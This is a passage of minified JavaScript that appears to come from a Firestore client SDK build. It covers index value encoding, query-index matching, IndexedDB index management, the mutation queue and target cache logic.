this.Pt(e).put({name:"sessionToken",value:t.toUint8Array()})}};var Tr=class{constructor(){}It(e,t){this.Tt(e,t),t.Et()}Tt(e,t){if("nullValue"in e)this.dt(t,5);else if("booleanValue"in e)this.dt(t,10),t.At(e.booleanValue?1:0);else if("integerValue"in e)this.dt(t,15),t.At(je(e.integerValue));else if("doubleValue"in e){let r=je(e.doubleValue);isNaN(r)?this.dt(t,13):(this.dt(t,15),_u(r)?t.At(0):t.At(r))}else if("timestampValue"in e){let r=e.timestampValue;this.dt(t,20),typeof r=="string"&&(r=Ar(r)),t.Rt(`${r.seconds||""}`),t.At(r.nanos||0)}else if("stringValue"in e)this.Vt(e.stringValue,t),this.ft(t);else if("bytesValue"in e)this.dt(t,30),t.gt(wi(e.bytesValue)),this.ft(t);else if("referenceValue"in e)this.yt(e.referenceValue,t);else if("geoPointValue"in e){let r=e.geoPointValue;this.dt(t,45),t.At(r.latitude||0),t.At(r.longitude||0)}else"mapValue"in e?LM(e)?this.dt(t,Number.MAX_SAFE_INTEGER):gp(e)?this.wt(e.mapValue,t):(this.St(e.mapValue,t),this.ft(t)):"arrayValue"in e?(this.bt(e.arrayValue,t),this.ft(t)):z()}Vt(e,t){this.dt(t,25),this.Dt(e,t)}Dt(e,t){t.Rt(e)}St(e,t){let r=e.fields||{};this.dt(t,55);for(let i of Object.keys(r))this.Vt(i,t),this.Tt(r[i],t)}wt(e,t){var r,i;let o=e.fields||{};this.dt(t,53);let s="value",a=((i=(r=o[s].arrayValue)===null||r===void 0?void 0:r.values)===null||i===void 0?void 0:i.length)||0;this.dt(t,15),t.At(je(a)),this.Vt(s,t),this.Tt(o[s],t)}bt(e,t){let r=e.values||[];this.dt(t,50);for(let i of r)this.Tt(i,t)}yt(e,t){this.dt(t,37),q.fromName(e).path.forEach(r=>{this.dt(t,60),this.Dt(r,t)})}dt(e,t){e.At(t)}ft(e){e.At(2)}};Tr.vt=new Tr;function u$(n){if(n===0)return 8;let e=0;return!(n>>4)&&(e+=4,n<<=4),!(n>>6)&&(e+=2,n<<=2),!(n>>7)&&(e+=1),e}function JA(n){let e=64-function(r){let i=0;for(let o=0;o<8;++o){let s=u$(255&r[o]);if(i+=s,s!==8)break}return i}(n);return Math.ceil(e/8)}var H_=class{constructor(){this.buffer=new Uint8Array(1024),this.position=0}Ct(e){let t=e[Symbol.iterator](),r=t.next();for(;!r.done;)this.Ft(r.value),r=t.next();this.Mt()}xt(e){let t=e[Symbol.iterator](),r=t.next();for(;!r.done;)this.Ot(r.value),r=t.next();this.Nt()}Lt(e){for(let t of e){let r=t.charCodeAt(0);if(r<128)this.Ft(r);else if(r<2048)this.Ft(960|r>>>6),this.Ft(128|63&r);else if(t<"\uD800"||"\uDBFF"<t)this.Ft(480|r>>>12),this.Ft(128|63&r>>>6),this.Ft(128|63&r);else{let i=t.codePointAt(0);this.Ft(240|i>>>18),this.Ft(128|63&i>>>12),this.Ft(128|63&i>>>6),this.Ft(128|63&i)}}this.Mt()}Bt(e){for(let t of e){let r=t.charCodeAt(0);if(r<128)this.Ot(r);else if(r<2048)this.Ot(960|r>>>6),this.Ot(128|63&r);else if(t<"\uD800"||"\uDBFF"<t)this.Ot(480|r>>>12),this.Ot(128|63&r>>>6),this.Ot(128|63&r);else{let i=t.codePointAt(0);this.Ot(240|i>>>18),this.Ot(128|63&i>>>12),this.Ot(128|63&i>>>6),this.Ot(128|63&i)}}this.Nt()}kt(e){let t=this.qt(e),r=JA(t);this.Qt(1+r),this.buffer[this.position++]=255&r;for(let i=t.length-r;i<t.length;++i)this.buffer[this.position++]=255&t[i]}Kt(e){let t=this.qt(e),r=JA(t);this.Qt(1+r),this.buffer[this.position++]=~(255&r);for(let i=t.length-r;i<t.length;++i)this.buffer[this.position++]=~(255&t[i])}$t(){this.Ut(255),this.Ut(255)}Wt(){this.Gt(255),this.Gt(255)}reset(){this.position=0}seed(e){this.Qt(e.length),this.buffer.set(e,this.position),this.position+=e.length}zt(){return this.buffer.slice(0,this.position)}qt(e){let t=function(o){let s=new DataView(new ArrayBuffer(8));return s.setFloat64(0,o,!1),new Uint8Array(s.buffer)}(e),r=(128&t[0])!=0;t[0]^=r?255:128;for(let i=1;i<t.length;++i)t[i]^=r?255:0;return t}Ft(e){let t=255&e;t===0?(this.Ut(0),this.Ut(255)):t===255?(this.Ut(255),this.Ut(0)):this.Ut(t)}Ot(e){let t=255&e;t===0?(this.Gt(0),this.Gt(255)):t===255?(this.Gt(255),this.Gt(0)):this.Gt(e)}Mt(){this.Ut(0),this.Ut(1)}Nt(){this.Gt(0),this.Gt(1)}Ut(e){this.Qt(1),this.buffer[this.position++]=e}Gt(e){this.Qt(1),this.buffer[this.position++]=~e}Qt(e){let t=e+this.position;if(t<=this.buffer.length)return;let r=2*this.buffer.length;r<t&&(r=t);let i=new Uint8Array(r);i.set(this.buffer),this.buffer=i}},q_=class{constructor(e){this.jt=e}gt(e){this.jt.Ct(e)}Rt(e){this.jt.Lt(e)}At(e){this.jt.kt(e)}Et(){this.jt.$t()}},z_=class{constructor(e){this.jt=e}gt(e){this.jt.xt(e)}Rt(e){this.jt.Bt(e)}At(e){this.jt.Kt(e)}Et(){this.jt.Wt()}},uo=class{constructor(){this.jt=new H_,this.Ht=new q_(this.jt),this.Jt=new z_(this.jt)}seed(e){this.jt.seed(e)}Yt(e){return e===0?this.Ht:this.Jt}zt(){return this.jt.zt()}reset(){this.jt.reset()}};var lo=class n{constructor(e,t,r,i){this.indexId=e,this.documentKey=t,this.arrayValue=r,this.directionalValue=i}Zt(){let e=this.directionalValue.length,t=e===0||this.directionalValue[e-1]===255?e+1:e,r=new Uint8Array(t);return r.set(this.directionalValue,0),t!==e?r.set([0],this.directionalValue.length):++r[r.length-1],new n(this.indexId,this.documentKey,this.arrayValue,r)}};function hi(n,e){let t=n.indexId-e.indexId;return t!==0?t:(t=XA(n.arrayValue,e.arrayValue),t!==0?t:(t=XA(n.directionalValue,e.directionalValue),t!==0?t:q.comparator(n.documentKey,e.documentKey)))}function XA(n,e){for(let t=0;t<n.length&&t<e.length;++t){let r=n[t]-e[t];if(r!==0)return r}return n.length-e.length}var Of=class{constructor(e){this.Xt=new Re((t,r)=>Je.comparator(t.field,r.field)),this.collectionId=e.collectionGroup!=null?e.collectionGroup:e.path.lastSegment(),this.en=e.orderBy,this.tn=[];for(let t of e.filters){let r=t;r.isInequality()?this.Xt=this.Xt.add(r):this.tn.push(r)}}get nn(){return this.Xt.size>1}rn(e){if(Q(e.collectionGroup===this.collectionId),this.nn)return!1;let t=h_(e);if(t!==void 0&&!this.sn(t))return!1;let r=so(e),i=new Set,o=0,s=0;for(;o<r.length&&this.sn(r[o]);++o)i=i.add(r[o].fieldPath.canonicalString());if(o===r.length)return!0;if(this.Xt.size>0){let a=this.Xt.getIterator().getNext();if(!i.has(a.field.canonicalString())){let c=r[o];if(!this.on(a,c)||!this._n(this.en[s++],c))return!1}++o}for(;o<r.length;++o){let a=r[o];if(s>=this.en.length||!this._n(this.en[s++],a))return!1}return!0}an(){if(this.nn)return null;let e=new Re(Je.comparator),t=[];for(let r of this.tn)if(!r.field.isKeyField())if(r.op==="array-contains"||r.op==="array-contains-any")t.push(new Ys(r.field,2));else{if(e.has(r.field))continue;e=e.add(r.field),t.push(new Ys(r.field,0))}for(let r of this.en)r.field.isKeyField()||e.has(r.field)||(e=e.add(r.field),t.push(new Ys(r.field,r.dir==="asc"?0:1)));return new ea(ea.UNKNOWN_ID,this.collectionId,t,vu.empty())}sn(e){for(let t of this.tn)if(this.on(t,e))return!0;return!1}on(e,t){if(e===void 0||!e.field.isEqual(t.fieldPath))return!1;let r=e.op==="array-contains"||e.op==="array-contains-any";return t.kind===2===r}_n(e,t){return!!e.field.isEqual(t.fieldPath)&&(t.kind===0&&e.dir==="asc"||t.kind===1&&e.dir==="desc")}};function Dx(n){var e,t;if(Q(n instanceof ge||n instanceof Se),n instanceof ge){if(n instanceof bf){let i=((t=(e=n.value.arrayValue)===null||e===void 0?void 0:e.values)===null||t===void 0?void 0:t.map(o=>ge.create(n.field,"==",o)))||[];return Se.create(i,"or")}return n}let r=n.filters.map(i=>Dx(i));return Se.create(r,n.op)}function l$(n){if(n.getFilters().length===0)return[];let e=K_(Dx(n));return Q(Cx(e)),G_(e)||W_(e)?[e]:e.getFilters()}function G_(n){return n instanceof ge}function W_(n){return n instanceof Se&&uE(n)}function Cx(n){return G_(n)||W_(n)||function(t){if(t instanceof Se&&w_(t)){for(let r of t.getFilters())if(!G_(r)&&!W_(r))return!1;return!0}return!1}(n)}function K_(n){if(Q(n instanceof ge||n instanceof Se),n instanceof ge)return n;if(n.filters.length===1)return K_(n.filters[0]);let e=n.filters.map(r=>K_(r)),t=Se.create(e,n.op);return t=Ff(t),Cx(t)?t:(Q(t instanceof Se),Q(na(t)),Q(t.filters.length>1),t.filters.reduce((r,i)=>gE(r,i)))}function gE(n,e){let t;return Q(n instanceof ge||n instanceof Se),Q(e instanceof ge||e instanceof Se),t=n instanceof ge?e instanceof ge?function(i,o){return Se.create([i,o],"and")}(n,e):eM(n,e):e instanceof ge?eM(e,n):function(i,o){if(Q(i.filters.length>0&&o.filters.length>0),na(i)&&na(o))return HM(i,o.getFilters());let s=w_(i)?i:o,a=w_(i)?o:i,c=s.filters.map(l=>gE(l,a));return Se.create(c,"or")}(n,e),Ff(t)}function eM(n,e){if(na(e))return HM(e,n.getFilters());{let t=e.filters.map(r=>gE(n,r));return Se.create(t,"or")}}function Ff(n){if(Q(n instanceof ge||n instanceof Se),n instanceof ge)return n;let e=n.getFilters();if(e.length===1)return Ff(e[0]);if(BM(n))return n;let t=e.map(i=>Ff(i)),r=[];return t.forEach(i=>{i instanceof ge?r.push(i):i instanceof Se&&(i.op===n.op?r.push(...i.filters):r.push(i))}),r.length===1?r[0]:Se.create(r,n.op)}var Q_=class{constructor(){this.un=new Ru}addToCollectionParentIndex(e,t){return this.un.add(t),M.resolve()}getCollectionParents(e,t){return M.resolve(this.un.getEntries(t))}addFieldIndex(e,t){return M.resolve()}deleteFieldIndex(e,t){return M.resolve()}deleteAllFieldIndexes(e){return M.resolve()}createTargetIndexes(e,t){return M.resolve()}getDocumentsMatchingTarget(e,t){return M.resolve(null)}getIndexType(e,t){return M.resolve(0)}getFieldIndexes(e,t){return M.resolve([])}getNextCollectionGroupToUpdate(e){return M.resolve(null)}getMinOffset(e,t){return M.resolve(mn.min())}getMinOffsetFromCollectionGroup(e,t){return M.resolve(mn.min())}updateCollectionGroup(e,t,r){return M.resolve()}updateIndexEntries(e,t){return M.resolve()}},Ru=class{constructor(){this.index={}}add(e){let t=e.lastSegment(),r=e.popLast(),i=this.index[t]||new Re(ve.comparator),o=!i.has(r);return this.index[t]=i.add(r),o}has(e){let t=e.lastSegment(),r=e.popLast(),i=this.index[t];return i&&i.has(r)}getEntries(e){return(this.index[e]||new Re(ve.comparator)).toArray()}};var cf=new Uint8Array(0),Y_=class{constructor(e,t){this.databaseId=t,this.cn=new Ru,this.ln=new Zn(r=>yo(r),(r,i)=>ju(r,i)),this.uid=e.uid||""}addToCollectionParentIndex(e,t){if(!this.cn.has(t)){let r=t.lastSegment(),i=t.popLast();e.addOnCommittedListener(()=>{this.cn.add(t)});let o={collectionId:r,parent:Vt(i)};return tM(e).put(o)}return M.resolve()}getCollectionParents(e,t){let r=[],i=IDBKeyRange.bound([t,""],[TM(t),""],!1,!0);return tM(e).U(i).next(o=>{for(let s of o){if(s.collectionId!==t)break;r.push(qn(s.parent))}return r})}addFieldIndex(e,t){let r=cu(e),i=function(a){return{indexId:a.indexId,collectionGroup:a.collectionGroup,fields:a.fields.map(c=>[c.fieldPath.canonicalString(),c.kind])}}(t);delete i.indexId;let o=r.add(i);if(t.indexState){let s=$s(e);return o.next(a=>{s.put(QA(a,this.uid,t.indexState.sequenceNumber,t.indexState.offset))})}return o.next()}deleteFieldIndex(e,t){let r=cu(e),i=$s(e),o=Bs(e);return r.delete(t.indexId).next(()=>i.delete(IDBKeyRange.bound([t.indexId],[t.indexId+1],!1,!0))).next(()=>o.delete(IDBKeyRange.bound([t.indexId],[t.indexId+1],!1,!0)))}deleteAllFieldIndexes(e){let t=cu(e),r=Bs(e),i=$s(e);return t.j().next(()=>r.j()).next(()=>i.j())}createTargetIndexes(e,t){return M.forEach(this.hn(t),r=>this.getIndexType(e,r).next(i=>{if(i===0||i===1){let o=new Of(r).an();if(o!=null)return this.addFieldIndex(e,o)}}))}getDocumentsMatchingTarget(e,t){let r=Bs(e),i=!0,o=new Map;return M.forEach(this.hn(t),s=>this.Pn(e,s).next(a=>{i&&(i=!!a),o.set(s,a)})).next(()=>{if(i){let s=ie(),a=[];return M.forEach(o,(c,l)=>{O("IndexedDbIndexManager",`Using index ${function(P){return`id=${P.indexId}|cg=${P.collectionGroup}|f=${P.fields.map(G=>`${G.fieldPath}:${G.kind}`).join(",")}`}(c)} to execute ${yo(t)}`);let h=function(P,G){let Z=h_(G);if(Z===void 0)return null;for(let K of Sf(P,Z.fieldPath))switch(K.op){case"array-contains-any":return K.value.arrayValue.values||[];case"array-contains":return[K.value]}return null}(l,c),p=function(P,G){let Z=new Map;for(let K of so(G))for(let E of Sf(P,K.fieldPath))switch(E.op){case"==":case"in":Z.set(K.fieldPath.canonicalString(),E.value);break;case"not-in":case"!=":return Z.set(K.fieldPath.canonicalString(),E.value),Array.from(Z.values())}return null}(l,c),m=function(P,G){let Z=[],K=!0;for(let E of so(G)){let v=E.kind===0?kA(P,E.fieldPath,P.startAt):OA(P,E.fieldPath,P.startAt);Z.push(v.value),K&&(K=v.inclusive)}return new Yn(Z,K)}(l,c),y=function(P,G){let Z=[],K=!0;for(let E of so(G)){let v=E.kind===0?OA(P,E.fieldPath,P.endAt):kA(P,E.fieldPath,P.endAt);Z.push(v.value),K&&(K=v.inclusive)}return new Yn(Z,K)}(l,c),D=this.In(c,l,m),b=this.In(c,l,y),T=this.Tn(c,l,p),F=this.En(c.indexId,h,D,m.inclusive,b,y.inclusive,T);return M.forEach(F,$=>r.G($,t.limit).next(P=>{P.forEach(G=>{let Z=q.fromSegments(G.documentKey);s.has(Z)||(s=s.add(Z),a.push(Z))})}))}).next(()=>a)}return M.resolve(null)})}hn(e){let t=this.ln.get(e);return t||(e.filters.length===0?t=[e]:t=l$(Se.create(e.filters,"and")).map(r=>M_(e.path,e.collectionGroup,e.orderBy,r.getFilters(),e.limit,e.startAt,e.endAt)),this.ln.set(e,t),t)}En(e,t,r,i,o,s,a){let c=(t!=null?t.length:1)*Math.max(r.length,o.length),l=c/(t!=null?t.length:1),h=[];for(let p=0;p<c;++p){let m=t?this.dn(t[p/l]):cf,y=this.An(e,m,r[p%l],i),D=this.Rn(e,m,o[p%l],s),b=a.map(T=>this.An(e,m,T,!0));h.push(...this.createRange(y,D,b))}return h}An(e,t,r,i){let o=new lo(e,q.empty(),t,r);return i?o:o.Zt()}Rn(e,t,r,i){let o=new lo(e,q.empty(),t,r);return i?o.Zt():o}Pn(e,t){let r=new Of(t),i=t.collectionGroup!=null?t.collectionGroup:t.path.lastSegment();return this.getFieldIndexes(e,i).next(o=>{let s=null;for(let a of o)r.rn(a)&&(!s||a.fields.length>s.fields.length)&&(s=a);return s})}getIndexType(e,t){let r=2,i=this.hn(t);return M.forEach(i,o=>this.Pn(e,o).next(s=>{s?r!==0&&s.fields.length<function(c){let l=new Re(Je.comparator),h=!1;for(let p of c.filters)for(let m of p.getFlattenedFilters())m.field.isKeyField()||(m.op==="array-contains"||m.op==="array-contains-any"?h=!0:l=l.add(m.field));for(let p of c.orderBy)p.field.isKeyField()||(l=l.add(p.field));return l.size+(h?1:0)}(o)&&(r=1):r=0})).next(()=>function(s){return s.limit!==null}(t)&&i.length>1&&r===2?1:r)}Vn(e,t){let r=new uo;for(let i of so(e)){let o=t.data.field(i.fieldPath);if(o==null)return null;let s=r.Yt(i.kind);Tr.vt.It(o,s)}return r.zt()}dn(e){let t=new uo;return Tr.vt.It(e,t.Yt(0)),t.zt()}mn(e,t){let r=new uo;return Tr.vt.It(go(this.databaseId,t),r.Yt(function(o){let s=so(o);return s.length===0?0:s[s.length-1].kind}(e))),r.zt()}Tn(e,t,r){if(r===null)return[];let i=[];i.push(new uo);let o=0;for(let s of so(e)){let a=r[o++];for(let c of i)if(this.fn(t,s.fieldPath)&&Du(a))i=this.gn(i,s,a);else{let l=c.Yt(s.kind);Tr.vt.It(a,l)}}return this.pn(i)}In(e,t,r){return this.Tn(e,t,r.position)}pn(e){let t=[];for(let r=0;r<e.length;++r)t[r]=e[r].zt();return t}gn(e,t,r){let i=[...e],o=[];for(let s of r.arrayValue.values||[])for(let a of i){let c=new uo;c.seed(a.zt()),Tr.vt.It(s,c.Yt(t.kind)),o.push(c)}return o}fn(e,t){return!!e.filters.find(r=>r instanceof ge&&r.field.isEqual(t)&&(r.op==="in"||r.op==="not-in"))}getFieldIndexes(e,t){let r=cu(e),i=$s(e);return(t?r.U("collectionGroupIndex",IDBKeyRange.bound(t,t)):r.U()).next(o=>{let s=[];return M.forEach(o,a=>i.get([a.indexId,this.uid]).next(c=>{s.push(function(h,p){let m=p?new vu(p.sequenceNumber,new mn(wo(p.readTime),new q(qn(p.documentKey)),p.largestBatchId)):vu.empty(),y=h.fields.map(([D,b])=>new Ys(Je.fromServerFormat(D),b));return new ea(h.indexId,h.collectionGroup,y,m)}(a,c))})).next(()=>s)})}getNextCollectionGroupToUpdate(e){return this.getFieldIndexes(e).next(t=>t.length===0?null:(t.sort((r,i)=>{let o=r.indexState.sequenceNumber-i.indexState.sequenceNumber;return o!==0?o:re(r.collectionGroup,i.collectionGroup)}),t[0].collectionGroup))}updateCollectionGroup(e,t,r){let i=cu(e),o=$s(e);return this.yn(e).next(s=>i.U("collectionGroupIndex",IDBKeyRange.bound(t,t)).next(a=>M.forEach(a,c=>o.put(QA(c.indexId,this.uid,s,r)))))}updateIndexEntries(e,t){let r=new Map;return M.forEach(t,(i,o)=>{let s=r.get(i.collectionGroup);return(s?M.resolve(s):this.getFieldIndexes(e,i.collectionGroup)).next(a=>(r.set(i.collectionGroup,a),M.forEach(a,c=>this.wn(e,i,c).next(l=>{let h=this.Sn(o,c);return l.isEqual(h)?M.resolve():this.bn(e,o,c,l,h)}))))})}Dn(e,t,r,i){return Bs(e).put({indexId:i.indexId,uid:this.uid,arrayValue:i.arrayValue,directionalValue:i.directionalValue,orderedDocumentKey:this.mn(r,t.key),documentKey:t.key.path.toArray()})}vn(e,t,r,i){return Bs(e).delete([i.indexId,this.uid,i.arrayValue,i.directionalValue,this.mn(r,t.key),t.key.path.toArray()])}wn(e,t,r){let i=Bs(e),o=new Re(hi);return i.J({index:"documentKeyIndex",range:IDBKeyRange.only([r.indexId,this.uid,this.mn(r,t)])},(s,a)=>{o=o.add(new lo(r.indexId,t,a.arrayValue,a.directionalValue))}).next(()=>o)}Sn(e,t){let r=new Re(hi),i=this.Vn(t,e);if(i==null)return r;let o=h_(t);if(o!=null){let s=e.data.field(o.fieldPath);if(Du(s))for(let a of s.arrayValue.values||[])r=r.add(new lo(t.indexId,e.key,this.dn(a),i))}else r=r.add(new lo(t.indexId,e.key,cf,i));return r}bn(e,t,r,i,o){O("IndexedDbIndexManager","Updating index entries for document '%s'",t.key);let s=[];return function(c,l,h,p,m){let y=c.getIterator(),D=l.getIterator(),b=js(y),T=js(D);for(;b||T;){let F=!1,$=!1;if(b&&T){let P=h(b,T);P<0?$=!0:P>0&&(F=!0)}else b!=null?$=!0:F=!0;F?(p(T),T=js(D)):$?(m(b),b=js(y)):(b=js(y),T=js(D))}}(i,o,hi,a=>{s.push(this.Dn(e,t,r,a))},a=>{s.push(this.vn(e,t,r,a))}),M.waitFor(s)}yn(e){let t=1;return $s(e).J({index:"sequenceNumberIndex",reverse:!0,range:IDBKeyRange.upperBound([this.uid,Number.MAX_SAFE_INTEGER])},(r,i,o)=>{o.done(),t=i.sequenceNumber+1}).next(()=>t)}createRange(e,t,r){r=r.sort((s,a)=>hi(s,a)).filter((s,a,c)=>!a||hi(s,c[a-1])!==0);let i=[];i.push(e);for(let s of r){let a=hi(s,e),c=hi(s,t);if(a===0)i[0]=e.Zt();else if(a>0&&c<0)i.push(s),i.push(s.Zt());else if(c>0)break}i.push(t);let o=[];for(let s=0;s<i.length;s+=2){if(this.Cn(i[s],i[s+1]))return[];let a=[i[s].indexId,this.uid,i[s].arrayValue,i[s].directionalValue,cf,[]],c=[i[s+1].indexId,this.uid,i[s+1].arrayValue,i[s+1].directionalValue,cf,[]];o.push(IDBKeyRange.bound(a,c))}return o}Cn(e,t){return hi(e,t)>0}getMinOffsetFromCollectionGroup(e,t){return this.getFieldIndexes(e,t).next(nM)}getMinOffset(e,t){return M.mapArray(this.hn(t),r=>this.Pn(e,r).next(i=>i||z())).next(nM)}};function tM(n){return dt(n,"collectionParents")}function Bs(n){return dt(n,"indexEntries")}function cu(n){return dt(n,"indexConfiguration")}function $s(n){return dt(n,"indexState")}function nM(n){Q(n.length!==0);let e=n[0].indexState.offset,t=e.largestBatchId;for(let r=1;r<n.length;r++){let i=n[r].indexState.offset;oE(i,e)<0&&(e=i),t<i.largestBatchId&&(t=i.largestBatchId)}return new mn(e.readTime,e.documentKey,t)}var rM={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},gn=class n{constructor(e,t,r){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=r}static withCacheSize(e){return new n(e,n.DEFAULT_COLLECTION_PERCENTILE,n.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}};function bx(n,e,t){let r=n.store("mutations"),i=n.store("documentMutations"),o=[],s=IDBKeyRange.only(t.batchId),a=0,c=r.J({range:s},(h,p,m)=>(a++,m.delete()));o.push(c.next(()=>{Q(a===1)}));let l=[];for(let h of t.mutations){let p=NM(e,h.key.path,t.batchId);o.push(i.delete(p)),l.push(h.key)}return M.waitFor(o).next(()=>l)}function Vf(n){if(!n)return 0;let e;if(n.document)e=n.document;else if(n.unknownDocument)e=n.unknownDocument;else{if(!n.noDocument)throw z();e=n.noDocument}return JSON.stringify(e).length}gn.DEFAULT_COLLECTION_PERCENTILE=10,gn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,gn.DEFAULT=new gn(41943040,gn.DEFAULT_COLLECTION_PERCENTILE,gn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),gn.DISABLED=new gn(-1,0,0);var Lf=class n{constructor(e,t,r,i){this.userId=e,this.serializer=t,this.indexManager=r,this.referenceDelegate=i,this.Fn={}}static lt(e,t,r,i){Q(e.uid!=="");let o=e.isAuthenticated()?e.uid:"";return new n(o,t,r,i)}checkEmpty(e){let t=!0,r=IDBKeyRange.bound([this.userId,Number.NEGATIVE_INFINITY],[this.userId,Number.POSITIVE_INFINITY]);return fi(e).J({index:"userMutationsIndex",range:r},(i,o,s)=>{t=!1,s.done()}).next(()=>t)}addMutationBatch(e,t,r,i){let o=Ks(e),s=fi(e);return s.add({}).next(a=>{Q(typeof a=="number");let c=new bu(a,t,r,i),l=function(y,D,b){let T=b.baseMutations.map($=>xu(y.ct,$)),F=b.mutations.map($=>xu(y.ct,$));return{userId:D,batchId:b.batchId,localWriteTimeMs:b.localWriteTime.toMillis(),baseMutations:T,mutations:F}}(this.serializer,this.userId,c),h=[],p=new Re((m,y)=>re(m.canonicalString(),y.canonicalString()));for(let m of i){let y=NM(this.userId,m.key.path,a);p=p.add(m.key.path.popLast()),h.push(s.put(l)),h.push(o.put(y,mB))}return p.forEach(m=>{h.push(this.indexManager.addToCollectionParentIndex(e,m))}),e.addOnCommittedListener(()=>{this.Fn[a]=c.keys()}),M.waitFor(h).next(()=>c)})}lookupMutationBatch(e,t){return fi(e).get(t).next(r=>r?(Q(r.userId===this.userId),co(this.serializer,r)):null)}Mn(e,t){return this.Fn[t]?M.resolve(this.Fn[t]):this.lookupMutationBatch(e,t).next(r=>{if(r){let i=r.keys();return this.Fn[t]=i,i}return null})}getNextMutationBatchAfterBatchId(e,t){let r=t+1,i=IDBKeyRange.lowerBound([this.userId,r]),o=null;return fi(e).J({index:"userMutationsIndex",range:i},(s,a,c)=>{a.userId===this.userId&&(Q(a.batchId>=r),o=co(this.serializer,a)),c.done()}).next(()=>o)}getHighestUnacknowledgedBatchId(e){let t=IDBKeyRange.upperBound([this.userId,Number.POSITIVE_INFINITY]),r=-1;return fi(e).J({index:"userMutationsIndex",range:t,reverse:!0},(i,o,s)=>{r=o.batchId,s.done()}).next(()=>r)}getAllMutationBatches(e){let t=IDBKeyRange.bound([this.userId,-1],[this.userId,Number.POSITIVE_INFINITY]);return fi(e).U("userMutationsIndex",t).next(r=>r.map(i=>co(this.serializer,i)))}getAllMutationBatchesAffectingDocumentKey(e,t){let r=hf(this.userId,t.path),i=IDBKeyRange.lowerBound(r),o=[];return Ks(e).J({range:i},(s,a,c)=>{let[l,h,p]=s,m=qn(h);if(l===this.userId&&t.path.isEqual(m))return fi(e).get(p).next(y=>{if(!y)throw z();Q(y.userId===this.userId),o.push(co(this.serializer,y))});c.done()}).next(()=>o)}getAllMutationBatchesAffectingDocumentKeys(e,t){let r=new Re(re),i=[];return t.forEach(o=>{let s=hf(this.userId,o.path),a=IDBKeyRange.lowerBound(s),c=Ks(e).J({range:a},(l,h,p)=>{let[m,y,D]=l,b=qn(y);m===this.userId&&o.path.isEqual(b)?r=r.add(D):p.done()});i.push(c)}),M.waitFor(i).next(()=>this.xn(e,r))}getAllMutationBatchesAffectingQuery(e,t){let r=t.path,i=r.length+1,o=hf(this.userId,r),s=IDBKeyRange.lowerBound(o),a=new Re(re);return Ks(e).J({range:s},(c,l,h)=>{let[p,m,y]=c,D=qn(m);p===this.userId&&r.isPrefixOf(D)?D.length===i&&(a=a.add(y)):h.done()}).next(()=>this.xn(e,a))}xn(e,t){let r=[],i=[];return t.forEach(o=>{i.push(fi(e).get(o).next(s=>{if(s===null)throw z();Q(s.userId===this.userId),r.push(co(this.serializer,s))}))}),M.waitFor(i).next(()=>r)}removeMutationBatch(e,t){return bx(e._e,this.userId,t).next(r=>(e.addOnCommittedListener(()=>{this.On(t.batchId)}),M.forEach(r,i=>this.referenceDelegate.markPotentiallyOrphaned(e,i))))}On(e){delete this.Fn[e]}performConsistencyCheck(e){return this.checkEmpty(e).next(t=>{if(!t)return M.resolve();let r=IDBKeyRange.lowerBound(function(s){return[s]}(this.userId)),i=[];return Ks(e).J({range:r},(o,s,a)=>{if(o[0]===this.userId){let c=qn(o[1]);i.push(c)}else a.done()}).next(()=>{Q(i.length===0)})})}containsKey(e,t){return Tx(e,this.userId,t)}Nn(e){return Sx(e).get(this.userId).next(t=>t||{userId:this.userId,lastAcknowledgedBatchId:-1,lastStreamToken:""})}};function Tx(n,e,t){let r=hf(e,t.path),i=r[1],o=IDBKeyRange.lowerBound(r),s=!1;return Ks(n).J({range:o,H:!0},(a,c,l)=>{let[h,p,m]=a;h===e&&p===i&&(s=!0),l.done()}).next(()=>s)}function fi(n){return dt(n,"mutations")}function Ks(n){return dt(n,"documentMutations")}function Sx(n){return dt(n,"mutationQueues")}var aa=class n{constructor(e){this.Ln=e}next(){return this.Ln+=2,this.Ln}static Bn(){return new n(0)}static kn(){return new n(-1)}};var Z_=class{constructor(e,t){this.referenceDelegate=e,this.serializer=t}allocateTargetId(e){return this.qn(e).next(t=>{let r=new aa(t.highestTargetId);return t.highestTargetId=r.next(),this.Qn(e,t).next(()=>t.highestTargetId)})}getLastRemoteSnapshotVersion(e){return this.qn(e).next(t=>ee.fromTimestamp(new $e(t.lastRemoteSnapshotVersion.seconds,t.lastRemoteSnapshotVersion.nanoseconds)))}getHighestSequenceNumber(e){return this.qn(e).next(t=>t.highestListenSequenceNumber)}setTargetsMetadata(e,t,r){return this.qn(e).next(i=>(i.highestListenSequenceNumber=t,r&&(i.lastRemoteSnapshotVersion=r.toTimestamp()),t>i.highestListenSequenceNumber&&(i.highestListenSequenceNumber=t),this.Qn(e,i)))}addTargetData(e,t){return this.Kn(e,t).next(()=>this.qn(e).next(r=>(r.targetCount+=1,this.$n(t,r),this.Qn(e,r))))}updateTargetData(e,t){return this.Kn(e,t)}removeTargetData(e,t){return this.removeMatchingKeysForTargetId(e,t.targetId).next(()=>Hs(e).delete(t.targetId)).next(()=>this.qn(e)).next(r=>(Q(r.targetCount>0),r.targetCount-=1,this.Qn(e,r)))}removeTargets(e,t,r){let i=0,o=[];return Hs(e).J((s,a)=>{let c=hu(a);c.sequenceNumber<=t&&r.get(c.targetId)===null&&(i++,o.push(this.removeTargetData(e,c)))}).next(()=>M.waitFor(o)).next(()=>i)}forEachTarget(e,t){return Hs(e).J((r,i)=>{let o=hu(i);t(o)})}qn(e){return iM(e).get("targetGlobalKey").next(t=>(Q(t!==null),t))}Qn(e,t){return iM(e).put("targetGlobalKey",t)}Kn(e,t){return Hs(e).put(Ix(this.serializer,t))}$n(e,t){let r=!1;return e.targetId>t.highestTargetId&&(t.highestTargetId=e.targetId,r=!0),e.sequenceNumber>t.highestListenSequenceNumber&&(t.highestListenSequenceNumber=e.sequenceNumber,r=!0),r}getTargetCount(e){return this.qn(e).next(t=>t.targetCount)}getTargetData(e,t){let r=yo(t),i=IDBKeyRange.bound([r,Number.NEGATIVE_INFINITY],[r,Number.POSITIVE_INFINITY]),o=null;return Hs(e).J({range:i,index:"queryTargetsIndex"},(s,a,c)=>{let l=hu(a);ju(t,l.target)&&(o=l,c.done())}).next(()=>o)}addMatchingKeys(e,t,r){let i=[],o=pi(e);return t.forEach(s=>{let 